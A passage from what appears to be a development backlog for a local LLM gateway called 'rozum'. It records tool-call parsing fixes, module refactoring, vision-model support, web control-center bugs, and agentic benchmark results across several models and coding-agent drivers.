  without risking the host → behind `ROZUM_CLOSED_LOOP_ADMISSION`, validated on a push-to-jetsam rig, default-on
  only once proven. See the spec.

- [x] **gw-toolcall-parse-observability** — DONE (this commit). Driver tool-delivery failures are now
  grep-able instead of needing manual `ROZUM_RAW_DUMP` + kept-workdir forensics. `serving::toolish_markers`
  (shared, unit-tested) lists the tool-call markup fragments across dialects; BOTH finalize seams — the
  single-request engine seam (`engine::consume_tokens`) and the batched mlx seam
  (`mlx_native_backend::finalize`) — emit `toolcall_parse_miss { model_type, markers, text_chars, tail }`
  to `~/.rozum/gateway.jsonl` when a response carries tool markup but ZERO calls parsed (the exact
  delivery-mismatch signature; only the miss is logged → no noise). Additive, low-risk.

- [x] **gw-toolcall-normalizer-corpus** — the valuable parts DONE; the risky part deferred with rationale.
  (1) GOLDEN CORPUS already exists + is comprehensive (audited 2026-07-14): ~15 apply_patch regression tests
  in gateway's test module (unified-diff bridge, method-B fuzz, JSON-wrapped `-patches`, exec-array /
  `cmd:apply_patch` sibling, function-call reroute, unicode-escape decode, WS-fallback, structured
  patches-array multi-file, create-vs-patch, path/file/filename key aliases) + 25 parse-dialect tests in
  serving.rs (GLM `<arg_key>`, XML `<function=`, Qwen-Coder ±wrapper + `&quot;`/numeric-entity, DeepSeek
  native, loose JSON, repair-unescaped-quotes, parameters alias). Every hard-won form from memory has a
  test. (2) GROUPED: the previously-scattered `rewrite_apply_patch_*` / `normalize_codex_tool_args` /
  file-write-synth rewriters are now ONE module (`codex_patch`, via gw-monolith-decompose). REMAINING
  (deferred, LOW value / HIGH risk): merging them into a single dispatch function — a rewrite of
  well-tested WORKING delivery code whose only gain is organizational; the corpus + the module grouping
  already capture the value. Revisit only if a new malformed form needs a structurally different handler.

- [~] **gw-monolith-decompose** — the CLEANLY-SEPARABLE (zero-back-reference) leaf clusters are extracted;
  the rest is an architectural refactor, not a mechanical peel. `gateway.rs` was **6841 lines**; now **5688**
  (−17%) across 3 modules, **all 106 gateway tests green** at every step (behaviour-preserving):
  `codex_patch.rs` (~780 lines — the apply_patch/tool-arg rewriters), `loopbreak.rs` (~265 — the stuck-loop
  detector), `codex_lean.rs` (~110 — the codex tool/prompt-trim policy). Each verified truly self-contained
  (no `crate::`/`super::` refs AND — the method lesson from an aborted `context_fit`/`codex_capture` attempt
  — no UNQUALIFIED intra-gateway calls nor gateway-local param DTOs), made `pub(crate)`, glob-imported so
  call sites + tests read unchanged. Also completes gw-toolcall-normalizer-corpus's "group the rewriters".
  **BOUNDARY reached:** the remaining clusters aren't leaves — request-mapping needs gateway-local wire DTOs
  (`OaiMsg`/`RespTool`/`AnthropicMsg`), auto-context calls `error_json` + streaming types, and the async
  handlers are coupled to `GatewayState`. Peeling those cleanly is an ARCHITECTURAL pass (move each dialect's
  wire types + their→internal mapping INTO `openai_http`/`anthropic_http`; extract an error-response module;
  decouple handlers from state), not a move — a dedicated design effort with the tests as the net. `control.rs`
  (3833) likewise. MEDIUM value, LOW urgency.

- [x] **models-cleanup** (2026-07-13, operator: "Удаляй лишние модели если не нужны") — pruned the
  local model set to the matrix winners. DELETED `Qwen3.5-4B-MLX-bf16` (8.5 GB, redundant: the 4-bit
  `Qwen3.5-4B-MLX-4bit` scores IDENTICALLY **6/6** AND does vision — no code change, the loaders
  already split 4bit-text / bf16-vision, and the mlx-community 4-bit checkpoint keeps vision bf16) and
  `Qwen3-Coder-30B-A3B` (16 GB, only **3/6** even after the tool-call fix; residual 4-bit degeneration
  on escaped code — the 35B is strictly better). KEEP: `Qwen3.6-35B-A3B-4bit` (6/6, top coder),
  `Qwen3.5-4B-MLX-4bit` (6/6 + vision), `Qwen3-4B-4bit` (5/6, fast). Cache 48 → 24 GB. Scores in
  scripts/bench/results/agentic-fullmatrix/.

- [x] **matrix-harder-tasks** (2026-07-13, operator: "В матрицу добавь какие нибудь еще более сложные
  задачи") — two harder agentic tasks in scripts/bench/agentic.sh to differentiate models past the
  single-file basics: `wordcount` (from-scratch — read a file arg, case-insensitive word frequency,
  print top-3 by count with ALPHABETICAL tie-break as `word count`: HashMap + sort + tie-break + I/O +
  case-fold; seeded input.txt has a 3-count tie apple/banana; verify `apple 3` / `banana 3` /
  `cherry 2`) and `multibug` (debug — TWO bugs in two functions of src/lib.rs, `add` subtracts +
  `is_even` checks odd; fix both, cargo test green). Wired through TASK_LIST / DIFF / prompt_for /
  setup_task / verify_task / bench_package_name / repair_goal_hint; reference-verified.

- [x] **gateway-onboarding-hardening** — CLOSED (2026-07-13). (a) profile probe + (b) principled turn-end
  landed (`45acea9`), (c) template-safe normalization shipped (`f0c7366`). (e) is a no-op:
  `parse_tool_calls` already scans `<tool_call>`/`<function=` anywhere in the final text (only the live
  stream-display suppression is start-anchored, cosmetic). (d) CONSTRAINED DECODING → **WON'T-DO**: its
  sole target was the Qwen3-Coder-30B 4-bit class that degenerates emitting JSON-escaped code, and that
  model was DELETED in `models-cleanup`. Building a logit-constraining tool-format enforcer for a model
  class we no longer ship is speculative; revisit only if a future kept model shows the same
  JSON-escape degeneration. Original detail below.
  ~~[ ] gateway-onboarding-hardening~~ — the VL port + the matrix fixes revealed that bringing a new
  model up agentically is a series of SCATTERED patches, each in a different subsystem, each found by
  failure. Concrete evidence: (1) STOP TOKENS — Qwen3.5's config eos is `<|endoftext|>` but its
  template ends turns with `<|im_end|>`, so without the augment-list hack (`ce3948f`) every turn
  over-ran → tool-calls never parsed. (2) CHAT TEMPLATE — Qwen3.5's template `raise`s on "no user
  query" / "system not first"; a small window trimmed the user turn → 500 mid-loop (`f0c7366`
  normalizes system+user — a targeted guard). (3) TOOL-CALL FORMAT — Qwen3-Coder emits `<function=…>`
  XML sometimes WITHOUT a `<tool_call>` wrapper → the call was dropped (`8f115e4` scans bare
  `<function=`), and the 4-bit model DEGENERATES emitting escaped code inside the JSON tool form,
  which no parser can recover. PROPOSAL: (a) a load-time **model-profile probe** — render a canonical
  agentic conversation (system + user + assistant-tool-call + tool-result) plus a forced tool call,
  assert the template doesn't raise and the call round-trips, catching the eos/template/tool-format
  quirks BEFORE serving instead of on the first agent; (b) principled turn-end resolution (collect
  every stop marker the template emits, not just config eos); (c) a template-safe message builder that
  enforces strict-template invariants generically (single leading system, ≥1 user turn, tool-result
  wrapper); (d) CONSTRAINED DECODING to force ONE reliable tool format (XML raw-content) for models
  that degenerate on JSON-escaped code — kills the Coder-30B class at the source; (e) the streaming
  tool-call detector must find `<tool_call>`/`<function=` ANYWHERE in a turn (Coder-30B narrates then
  calls). Spec candidate: docs/specs/gateway-model-onboarding.md.
  LANDED (`45acea9`): (a) load-time **model-profile probe** — renders a canonical agentic
  conversation at load and logs `model profile [type] — agentic render OK/FAILED, strict
  template → normalization active, stop tokens […]`, so onboarding quirks surface in the
  load log; (b) **principled turn-end** — the eos set now takes the DECLARED
  `tokenizer_config.eos_token` (+ Gemma/Llama-3 fallbacks) instead of a guessed list.
  (c) template-safe message normalization already shipped (`f0c7366`). REMAINING: (d)
  constrained decoding to force ONE reliable tool format for models that degenerate on
  JSON-escaped code; (e) streaming tool-call detect-anywhere (note: `parse_tool_calls`
  ALREADY scans `<tool_call>`/`<function=` anywhere in the final text — only the live
  stream display suppression is start-anchored, cosmetic).

- [x] **vl-followups** — DONE (mlx-lm `7415d4f6`, rozum this commit). Qwen3.5-VL shipped single-image
  first; all follow-ups now landed + verified end-to-end on the dense 4B (`mlx-community:Qwen3.5-4B-MLX-4bit`):
  (a) **multi-image per request** — instead of cu_seqlens block-diagonal attention I run the vision
  tower once PER image and splice each independently: `MM_SPLICE` / `MmContext.splice` became
  `Vec<(embeds,start)>`, `apply_mm_splice` sorts + stitches all blocks in one pass (each is a
  same-length replacement so blocks don't shift), `rope_index` generalises the single-image variant to
  N grids (k-th image-token run consumes the k-th grid), and `build_vl_context` loops every image,
  expands each `<|image_pad|>` in place, and builds the combined M-RoPE. Dense + MoE `Generate` updated
  in lockstep. VERIFIED: cats+bear in one request → the model described BOTH ("two tabby cats on a pink
  couch" + "a large brown bear in green grass"). (b) **quant-vision guard** — `load_vision_tower` now
  detects a quantized tower (`vision_tower.*.scales`/`.biases`) and rejects it with a clear error
  instead of loading garbage (VisionModel uses dense Linear; no quantized-vision checkpoint exists yet
  — mlx-vlm keeps the tower bf16 even in 4-bit quants), and errors on zero matched vision weights
  instead of a silently-random tower. (c) **last-position prefill logits** — VL prefill now runs the
  backbone then projects ONLY the last position through `lm_head` (image-padded positions never feed
  the vocab head), dropping the wasteful all-position projection. ~~(d) extend the vision load to
  qwen3_5_moe~~ DONE earlier (`1a9463a` + mlx-lm `1dd3107b`): the flagship **Qwen3.6-35B-A3B describes
  images** (config-driven ViT loaded its larger tower unchanged). Note: VL loads must use the canonical
  COLON spec (`mlx-community:Qwen3.5-4B-MLX-4bit`); a raw snapshot-dir path isn't a recognized spec, so
  the admission gate can't size it and refuses with a sentinel footprint (`ROZUM_ALLOW_CONCURRENT_RESIDENT=1`
  overrides — see backlog note). See docs/specs/qwen3-5-vl-port.md.

- [x] **bench-infra-hardening** — both structural fixes now in place.
  (1) DONE (already, verified 2026-07-13) — the `clients_gone` self-exit is ALREADY gated behind
  `launch_managed` in the current gateway (`gateway.rs:4830`/`4838`; the old "MLX can_reload ⇒ un-gated
  branch" memory note was STALE), and `agentic.sh:799` starts its shared gateway with
  `ROZUM_GATEWAY_IDLE_SECS=0 ROZUM_GATEWAY_UNLOAD_IDLE_SECS=0` and NOT launch-managed, so neither the
  lifecycle exit nor the idle-unload fires between tasks. Only cooperative preemption (`4862`) can still
  evict it, and that only if a higher-priority load arrives mid-matrix (shouldn't during a bench). No
  code change needed.
  (2) DONE (this commit) — a per-cell **no-progress early-abort** in `agentic.sh`: a background monitor
  watches the claude stream-json and kills the cell the instant it stops making forward progress —
  either the last `NP_REPEAT` (5) tool calls are byte-identical (churn the gateway loop-breaker can't
  end at the agent level, since the CLI just re-issues next turn) or assistant turns run `NP_STALL_TURNS`
  (8) ahead of tool_uses (talking, not acting). Reclaims the wall-clock a wedged cell burned to the
  600s RUN_TIMEOUT. Off with `NP_ABORT=0`; logs the reason + seconds saved. Detection logic unit-tested
  on synthetic churn/stall/healthy stream-json. Config lesson (no code): run agentic at **NCTX ≥ 16384**
  — 4096 trim-thrashes CC's big system prompt (3× slower + triggers the template-trim 500).

- [x] **ucc-terminal-keys — DONE 2026-07-08 (`34c713e`).** The phone terminal has a top
  special-keys row for Esc, Tab, ⇧Tab, ← ↑ ↓ →, ^C, and ^U; every button sends the raw terminal
  sequence over the existing WebSocket. `touchstart` is non-passive and both touch/mouse handlers
  call `preventDefault`, so xterm keeps focus and the iOS keyboard stays open. The source
  (`clients/control/terminal.ssc`) and checked-in generated page
  (`clients/control/site/terminal.html`) both contain the row; live phone interaction remains the
  release smoke for browser/keyboard-specific behavior.

- [x] **ucc-jobpanel-pattern** (operator: "Асинхронный паттерн можно выразить как скаласкрипт
  функцию и тулкит выражение? … Делай а б в г") — the async-job pattern is now expressed ONCE per
  side: (а) `jobPanel` .ssc function in center.ssc — agents/coders/sessions became three calls;
  agents+coders gained the per-row ✕ close, the Stop-agent/Stop-coder textField cards are gone;
  (б) PROMOTED to `std/ui/patterns.ssc` (scalascript `89168f717`) with conformance
  `std-ui-jobpanel` (INT+JS, node-tree shape) — center.ssc now imports it; (в) Rust half folded
  into `control.rs spawn_launch_task(model,id,still_wanted,set_failed,do_spawn)` — the three launch
  routes keep only validation + registry push + their spawn closure; (г) `ucc-ssc-backend`
  (server half as a scalascript function on a .ssc→Rust UCC server) recorded in BACKLOG with the
  missing-toolkit inventory (WebAuthn, PTY↔WS, process registry, launchd, admission FFI).

- [x] **ucc-sessions-ux** (operator 2026-07-07: "выбор кнопки отмечать визуально; модели отсортировать
  по адекватности/рейтингу в матрице + звёздочки; секцию Stop session убрать — вместо неё кнопка
  закрыть в списке живых сессий после кнопки войти") — all three source-level, no new injections:
  (1) agent pickers (sessions + coders) switched `signalButton` → `signalLabelButton` with computed
  "✓ <agent>" labels — the selected button shows the mark; (2) `/control/status` `installed[]` now
  carries a `stars` display field from a static `model_stars` table (control.rs — distilled matrix
  results, GLM-4.7-Flash=5★ … Qwen3-0.6B=1★, unknown unrated) and is sorted best-first; model
  pickers gained a ★ column (`modelSelectCols`); (3) `Stop session` card removed, `sessionsList`
  gained `rowPostAction("✕ close", POST /control/session/stop, fieldPayload(id), refresh)` — the
  close button sits in each live-session row after the 🖥 terminal link. TR maps updated (✕ close →
  закрыть/закрити). DONE-RIGHT follow-ups (same day): (a) stars now render UNDER the model name via
  the new std/ui `stackedColumn` (scalascript `cc5af9e39`, additive 'stacked' column kind in the
  js-runtime; rozum side `2741c17`); (b) ratings now come from the LIVE matrix results —
  `scripts/bench/export_model_ratings.py` aggregates claude-driver pass-rates over all non-archived
  `results/*/per-run.csv` (greet + rc=2 excluded for honesty, >=5 runs to rate) into
  `~/.rozum/ucc/model-ratings.json`; control-serve prefers it over the static table (exact-spec
  match) and run_full_matrix.sh refreshes it after every matrix; (c) source file renamed
  `control-center-live.ssc` -> `center.ssc` (operator request).

- [x] **ucc-gateway-cold-start (BUG-007)** — the next bug behind "запуск моделей/агентов через веб
  не работает": with BUG-006's body parsing fixed, an authenticated `POST /control/session/launch`
  on a cold host still 409'd with `rozum gateway switch: no shared gateway running` (admission said
  `fits: true`). `control.rs::ensure_gateway` only knew reuse/`switch`; `switch` refuses when no
  daemon runs, so every model-needing UCC action (session/agent/coder launch, chat) required a
  terminal-started gateway first. Fix: ensure_gateway is async, health-checks the registry record
  (stale → fresh start), switches only a healthy different-model gateway, and otherwise cold-starts
  a detached `rozum gateway --model … --port 8089` (same shape as `rozum launch`'s
  spawn_detached_gateway) and waits ≤300s for register+health. Verified: unit tests + live
  authenticated smoke (busi SSO, SPA-shaped body): cold host → `{"ok":true}`, gateway self-starts on
  :8089, tmux session up with claude REPL, stop works; switch branch verified with the operator's
  target Qwen3.6-35B-A3B-4bit-DWQ (in-place swap, gen 1→2). Also fixed `deploy-ucc-web.sh` fallout
  found during deploy: stale SSC launcher jar path (removed coord-main worktree) + `emit-spa`
  truncating the LIVE index.html to 0 bytes on failure — now emits to a temp file and `mv`s only on
  success. Details: BUGS.md BUG-007.

- [x] **ucc-action-json-bodies** — fixed the UCC web action contract for sessions/coders/agents/projects.
  Repro: `formBody(...)` emits JSON but no `Content-Type`, so Axum `Json<T>` rejected
  `/control/session/launch` before the handler; the browser only saw a failed fetch and appeared idle.
  Fixed by `e451e6a` + `0a537df`: control action parsers now accept the SPA JSON body shape without
  relying on `Content-Type`, retain legacy plain/form bodies for stop/project actions, and return 400
  for malformed JSON-like action bodies. Verified with `cargo test -p rozum-gateway ucc_`,
  `cargo test -p rozum-gateway control::tests::`, `clients/control/deploy-ucc-web.sh`, and a local
  unauthenticated session-launch smoke that now reaches auth middleware (401) instead of extractor reject.
  Authenticated live launch is still subject to WebAuthn login and the existing model memory admission gate.
  Spec: `docs/specs/ucc-action-json-bodies.md`.

### ▶ GO-FORWARD PLAN (operator 2026-07-05: "спочатку швидкі виграші, потім усе що зможеш — зроби")

Ordered execution. Grounded in the session's thesis: the bottleneck is the model↔tools translation SEAM,
capability is RELATIONAL (model × driver), and OBSERVABILITY is what surfaces the next bug. Quick wins
first, then the strategic bets.

**QUICK WINS (hours, do first):**
- [x] **QW1 — auto-scale RUN_TIMEOUT for big/MoE models under codex/opencode** — codex×GLM-4.7-Flash all
  hit rc124 at 300s though 3/5 passed (slow, not wrong: MoE-lite adaptive load + codex overhead). In
  `agentic.sh` (or run_full_matrix), bump the per-run timeout when the model is large/MoE OR the driver is
  codex/opencode (e.g. min 600–900s), so slow-but-correct cells stop reading as false negatives.
- [x] **QW2 — bake fail-mode + capture into the default matrix flow** — always run `summarize_matrix.py`
  (already does tier/driver/fail-mode) AND default `ROZUM_CODEX_TOOL_CAPTURE=1` in `run_full_matrix.sh`
  so the next malformed-form bug is captured automatically (observability always-on; it paid off all
  session — `~/.rozum/gateway.jsonl` + `ROZUM_RAW_DUMP`).

**STRATEGIC BETS (bigger; the durable value is in the seam + routing):**
- [x] **B1 — universal seam normalizer** (replaces per-form whack-a-mole) — one recursive extractor: for
  ANY codex tool call, find `{path-like, content}` pairs (keys path|file|filename + content) under ANY
  array key (patches|file_changes|files|changes|ops) OR nested, and synthesize file writes. Catches
  FUTURE malformed shapes without new per-form code. Generalizes what R3/R3b did piecemeal. gateway.rs
  `synthesize_writes_from_patches` + the normalize/function-call paths. Unit-test against every captured
  shape in `~/.rozum/gateway.jsonl`.
- [x] **B2 — authoritative matrix** — DONE for gpt-oss (GLM-4.7-Flash RAM-blocked: sbt daemons respawned mid-run). RESULT (b2-authoritative-20260705-225020) — the DEFINITIVE delivery validation on the codex-trained model: **claude 5/5, codex 2/5, opencode 4/5 — with 0 delivery failures (0 rc11) across ALL drivers**. Every codex fail is rc10 = gpt-oss wrong CODE (model ceiling), not delivery. vs ucc baseline codex×gpt-oss ~2/5 deliver-heavy + opencode broken → delivery is SOLVED for gpt-oss. (GLM-4.7-Flash half needs a quieter machine; claude×GLM-4.7-Flash is already 6/6 from r4.) Was blocked by
  ~13.9 GB of external `java` (13 procs, sibling/IDE work) left only ~4–12 GB actually free (`vm_stat`), and a curated model
  is ~17–18 GB. The gateway correctly refused (forcing it risks a reboot). Stopped cleanly via TaskStop
  (no orphan gateway, no lock, machine up — no BUG-001). The r4 partial run ALREADY gave the conclusive
  aggregate (claude 100% / codex 33%→70% / opencode 0-broken→50%), so B2 is confirmation, not new signal.
  RE-RUN verbatim when the machine has ~20 GB free (`memory_pressure` / `vm_stat` free+inactive):
    `BENCH_BIN=./target/release/rozum-gateway BENCH_OUT=scripts/bench/results/b2-authoritative-$(date +%Y%m%d-%H%M%S) \`
    `NCTX=14336 GW_READY_SECS=7500 ROZUM_GATEWAY_RESIDENCY_WAIT_SECS=7200 \`
    `AGENTIC_MODELS="mlx-community:gpt-oss-20b-MXFP4-Q4 mlx-community:GLM-4.7-Flash-4bit" AGENTS="claude codex opencode" \`
    `TASKS="build fix test rpn debug" REPS=1 KEEP=1 RUN_TIMEOUT=900 REPAIR=1 ROZUM_CODEX_TOOL_CAPTURE=1 bash scripts/bench/agentic.sh`
  ⚠ 2026-07-07: the original command (no NCTX) fails DETERMINISTICALLY for GLM-4.7-Flash — at
  ctx=auto(max) the footprint estimate is ~91 GB and admission refuses before adaptive load can cap
  it (run_full_matrix.sh always sets NCTX, which is why the 07-03 full matrix loaded fine). And
  without the RESIDENCY_WAIT/GW_READY_SECS bump the gateway gives up after 240 s instead of queuing
  behind a sibling's RAM (sbt tests) — the July-5 "sbt daemons" failure was BOTH of these.
  (original plan below)
- [x] **B3 — model→driver routing at `rozum launch`** (operationalizes "capability is relational") —
  from the B2 table, warn or auto-select the driver a model is trained for (Devstral→claude-style,
  gpt-oss→codex ok, …). Converts driver-mismatch into reliability with NO new gateway code. The
  North-Star-aligned durable feature (value lives in the launch/gateway seam).

**STOP DOING (deliberate):** gateway whack-a-mole for driver-mismatched pairs (→ B3 routing, not code);
chasing model ceilings (Devstral test-assertion, gpt-oss wrong-code, Qwen newline variance — documented,
not harness). See [[project-matrix-hygiene-testcell]].

### ▶ r4 aggregate (all fixes + all 3 drivers working) — CONCLUSIVE (26/30, run killed but headline clear)

- [x] **r4-aggregate** — claude+codex+opencode × {gpt-oss, GLM-4.7-Flash} × {build,fix,test,rpn,debug}.
  RESULT (validates the whole session): **claude 10/10 (100%)**, **codex 7/10 (70%)** — up from the ucc
  baseline **33%** — and **opencode 3/6 (50%)** — up from **0/8 broken** (DB fix). codex×gpt-oss 4/5
  (delivery fixed, was ~2/5 deliver-heavy). ONLY residual = codex×GLM-4.7-Flash all rc124 timeout at
  RUN_TIMEOUT=300 (my run's tight cap; 3/5 still PASSED — the work is correct, just slow: MoE-lite
  adaptive load + codex overhead) → use RUN_TIMEOUT=900 (run_full_matrix default) for big models under
  codex, then codex ≈90%. Not a bug. Killed at 26/30 (missing opencode×GLM×4) — headline unaffected.

### ▶ Cumulative-effect measurement + opencode delivery diagnosis (operator 2026-07-05: "продовжуй поліпшувати")

- [x] **r3-cumulative-and-opencode** — DONE (measured + acted). RESULTS: **codex×gpt-oss delivery FIXED**
  (0 rc11: build+fix pass, test+rpn land-but-wrong) — round-1+round-2 confirmed working. Two residuals
  surfaced, both handled/triaged:
  1. **codex×Devstral create = DRIVER MISMATCH** (not a gateway bug, merged generalization `4d90235`).
     Capture showed Devstral invents a new malformed apply_patch structure almost every generation:
     exec `{cmd:apply_patch, patches:[{file,content}]}`, function-call `{patches:[{op:Add,path,content}]}`,
     `{file_changes:[{path}]}`, `{files:[…]}`, `{ops:[{op:replace}]}`, CLI `apply_patch -p X -c Y`,
     `write_stdin`, `cat<<EOF`. Unbounded whack-a-mole (Devstral isn't codex-trained). Shipped R3
     (file_changes alias) + R3b (path|file|filename + files array) — correct additive generalizations
     that reduce the surface + help codex×gpt-oss, but CANNOT make codex×Devstral reliable. **Operational
     answer: route Devstral through CLAUDE (5/6), not codex.** Remaining forms (function-call array, ops,
     CLI) deliberately NOT chased — diminishing returns on a driver mismatch.
  2. **opencode 0/8 (rc=1) → RESOLVED** (BACKLOG `opencode-500-v1-messages`). Ruled out the gateway by
     reproducing in isolation: `opencode run "hi"` failed even with NO gateway. Its own log showed
     `SQLiteError: no such column: replacement_seq` — opencode v1.16.2's DB was on a stale schema. Backed
     up the broken DB (reversible) → opencode recreated it → `opencode run` returns `ok`. NOT a rozum bug,
     NOT the tool-call fixes. opencode is unblocked for future matrices.

### ▶ Matrix hygiene + test-cell delivery fix (operator 2026-07-05: "як результати матриці? що можна покращити?" → A+B)

- [x] **matrix-hygiene-and-test-cell** — DONE + MERGED to master (`d20d176` merge of `bf8dea1`; follow-ups
  `e17dee2` fail-mode rollup, `6a287b7`+`cf355b8` BACKLOG). A (honest summarizer) + B (test-cell delivery
  fix) shipped. Detail below. Open follow-ups pulled into the **NEXT** block at the end of this entry.
  The Jul-5 broad matrix (`agentic-ucc-1783166880`, 9 models × 3 drivers × 5 tasks) read as "top 67%", but that headline
  BLENDED a broken backend + toy models + weak drivers into one average. Honest read: **claude × curated
  tier = 40/45 (89%)** — GLM-4-32B 15/15, Devstral 13/15, gpt-oss 12/15; `ollama:qwen2.5-coder:7b` is a
  broken backend (36× rc=1, 0 capability signal); codex 33% / opencode 47% drag the blend.
  - **A (report hygiene, done):** rewrote `scripts/bench/summarize_matrix.py` — tier-aware + per-driver.
    Leads with CAPABILITY (claude × curated tier), lists BROKEN backends (rc∈{1,2}-dominated) EXCLUDED
    from every rate, shows PROBE/small models separately, and a tiered footer that explicitly says the
    all-runs blend is NOT "capability". Verified on the real ucc CSV: headline 40/45 89%. Pure reporting,
    no behaviour change. Curated tier = CAPABLE_SUBSTRINGS, kept in sync with agentic.sh DEFAULT_MODELS.
  - **B (test-cell — DIAGNOSED + delivery fixed; cell still red, honestly):** the weakest real cell
    (`test`, Devstral 1/3). Live slice (Devstral × test × claude × REPS, new harness, RUN_TIMEOUT=300,
    REPAIR=1) decomposed it into THREE independent causes, only one of which is a harness bug:
    1. **Delivery near-miss (FIXED):** claude(Devstral) writes a valid Cargo.toml with ONE Write, then
       stops; src/main.rs never lands → `no targets specified` (rc=10/rc=11). Fix (B1) = new
       `repair_diagnostic` branch: Cargo.toml present but no `src/*.rs` → DIRECTIVE "create src/main.rs
       now". PROVEN: in every verified rep `cargo run -- hello -> olleh` now PASSES (src lands via repair).
    2. **Test-assertion transcription (MODEL bug, not fixable here):** Devstral writes
       `assert_eq!(reverse(""), "olleh")` — empty string instead of `"hello"` — although the prompt says
       `reverse("hello")` explicitly. `cargo test` correctly stays red.
    3. **Repair-time Edit-before-Read loop (the real remaining lever):** fed "cargo test red", the driver
       loops on Edit-before-Read ("File has not been read yet" ×2) and burns the whole RUN_TIMEOUT → rc=124.
       `repair_tool_protocol_hint` exists for exactly this but fires one attempt too late (the loop is in
       the FINAL repair attempt, no further attempt to apply the hint).
    - Net: Devstral×test did NOT go green (still 0/3 in the slice) — its ceiling here is model-side (#2)
      + the repair loop (#3), NOT delivery. B1 is still a correct, general win (delivery near-misses now
      converge). B3 = tightened `test` prompt (MUST create BOTH files; DONE only once `cargo test` passes
      AND olleh prints) — clearer, harmless.
    - **B2 was CONSIDERED then REVERTED:** flipping `REPAIR` default 0→1 looked right on paper, but the
      live slice showed it converts a fast rc=10 (~57 s) into a slow non-converging rc=124 (~360 s) via
      the #3 edit-loop. Every real launcher already sets REPAIR=1 explicitly, so the default only governs
      ad-hoc runs (fail-fast is the better signal there). Left at 0, with a comment recording why.
  - Verify: `bash -n` + py-compile clean; B1 branch unit-tested on a synthetic Cargo.toml-no-src dir;
    live 3-rep slice run (kept workdirs). A verified on the real ucc CSV (89% headline).
### ▶ DOING ALL — round-2 gateway/harness tool-call fixes (operator 2026-07-05: "делай всё") — ✅ MERGED `0ddce40`

All five items resolved. R2.1/R2.3/R2.5 shipped (unit-tested; R2.3 e2e rpn 0/2→2/3 pass, patches-bridge
fired). R2.2 diagnosed as model variance (no gateway fix). R2.4 subsumed by R2.3. Status tracker:
- [x] **R2.1 — `&quot;` html-entity decode** — DONE (`3005e3f`, branch feature/gateway-toolcall-round2).
  `decode_tool_arg_entities` applied in the plain-string fallback of BOTH `parse_xml_function` and
  `parse_glm_arg_kv` (serving.rs). Unit-tested on the observed Qwen3-Coder shape; 28 serving tests green.
  Correct win for the entity-emitting variance; e2e couldn't isolate (see R2.2 — the failure is
  nondeterministic and didn't recur).
- [x] **R2.2 — Qwen3-Coder newline diagnosis** — DONE (no gateway fix needed). `ROZUM_RAW_DUMP` proved
  the RAW model output HAS real newlines when the model emits them (`RAW: "...\n..."`), and
  `parse_xml_function` preserves interior newlines (`.trim()` only) → the one-line/`&quot;` corruption is
  MODEL OUTPUT VARIANCE, not a gateway strip. Live Qwen-Coder×fix 1/2: rep1 clean → PASS; rep2 a
  generation STALL (only a Bash call, file untouched, 600s timeout) — infra/variance, not entities. So
  Qwen-Coder fix/test reds = model variance ([[project-matrix-nondeterminism]]); R2.1 covers the entity
  slice, nothing more to fix in the gateway.
- [x] **R2.3 — rpn create-delivery residual** — DONE (`2c14a33`, merged `0ddce40`). E2E: rpn 0/2 (rc11)
  → **2/3 PASS, 0 rc11**; the patches-array bridge fired. CAPTURED the exact form with `ROZUM_CODEX_TOOL_CAPTURE`: it is NOT a V4A patch — codex
  emits a STRUCTURED `{"cmd":"apply_patch","patches":[{"path":"Cargo.toml","content":"…"},{"path":"src/main.rs","content":"…"}]}`
  (each entry a whole file, no `*** Add File:` markers). Round-1's fix keys off V4A markers and
  `synthesize_write_from_obj` only handles a single top-level `{path,content}`, so this array shape fell
  through → shim can't parse JSON → nothing lands (rc11, capture baseline confirmed rpn 0/2). Fix =
  `synthesize_writes_from_patches` (writes each `{path,content}` via the shared heredoc), wired into the
  `normalize_codex_tool_args {cmd:apply_patch}` branch. Unit-tested; 8 apply_patch tests green. NB: gpt-oss
  emits this form NONDETERMINISTICALLY (some runs use the round-1 shell form or Write), so e2e effect is
  probabilistic. Original notes: run codex×gpt-oss×rpn with `ROZUM_CODEX_TOOL_CAPTURE=1`
  to capture the exact `apply_patch` form the round-1 bridge misses (likely `*** Update File:` vs a file
  that doesn't exist, or a non-`content` JSON key), then extend `rewrite_json_wrapped_apply_patch` /
  `apply_patch_block_to_fuzz` to cover it. Unit-test + e2e codex×gpt-oss×rpn.
- [x] **R2.4 — glm32b-codex-timeout** — RESOLVED as SUBSUMED, no separate code. The original premise
  (per-turn reload) was wrong: a SINGLE model loads once and stays resident (only the lazy comma-pipeline
  reloads per turn). GLM-4-32B's codex timeouts are just codex being slow with a big model + apply_patch
  retries → R2.3 (fewer failed apply_patch retries) speeds convergence, and `run_full_matrix.sh` already
  sets RUN_TIMEOUT=900 for big models. Revisit only if timeouts persist after R2.3.
- [x] **R2.5 — test-cell-repair-failfast** — DONE (`1c9bfa0`). agentic.sh repair loop for→while +
  ONE bonus repair attempt granted when the Edit-before-Read marker ("File has not been read yet") first
  appears, so `repair_tool_protocol_hint` gets applied. Bounded (one bonus/cell), gated on the marker,
  no effect on non-looping cells. bash -n clean; exercised incidentally on any round-2 run whose cell loops.

### ▶ NEXT — what I'm doing now (matrix improvement, continuation of the above; cold-resumable)

Ordered by value. #1 is the active queue; do it the moment the GPU slot is free.

- [x] **DONE — curated-tier baseline matrix** (`scripts/bench/results/curated-baseline-20260705-*`).
  RESULT: **claude × curated = 30/36 (83%)**, REPS=1, 0 infra failures, slot torn down clean. Perfect:
  Qwen3.6-35B-DWQ 6/6, GLM-4.7-Flash 6/6. All 6 reds map to already-diagnosed levers (none are reasoning):
  Qwen-Coder fix+test = tool-arg decode bug (below); gpt-oss rpn + GLM-4-32B rpn = create-from-scratch
  delivery (apply_patch / GLM decision-gap); GLM-4-32B build = GLM create weakness + REPS=1 noise (was 3/3
  in ucc); Devstral test = known repair loop. 83% vs the ucc-derived 89% = REPS=1 single-sample noise +
  `rpn` added. Validates the new summarizer end-to-end on fresh data.
  (superseded IN FLIGHT note): `AGENTS=claude`, curated single
  models `Devstral, gpt-oss-20b, Qwen3-Coder-30B, Qwen3.6-35B-DWQ, GLM-4.7-Flash, GLM-4-32B`, all 6 tasks,
  REPS=1, REPAIR=1, RUN_TIMEOUT=360, NCTX=32768, KEEP=1, BENCH_BIN=target/release/rozum-gateway.
  Purpose: the AUTHORITATIVE clean headline (the ucc run was a polluted zoo) + end-to-end validation of the
  new summarizer on fresh data. WHEN IT FINISHES: run `python3 scripts/bench/summarize_matrix.py
  scripts/bench/results/curated-baseline-<stamp>/per-run.csv`, report the CAPABILITY headline + fail-mode
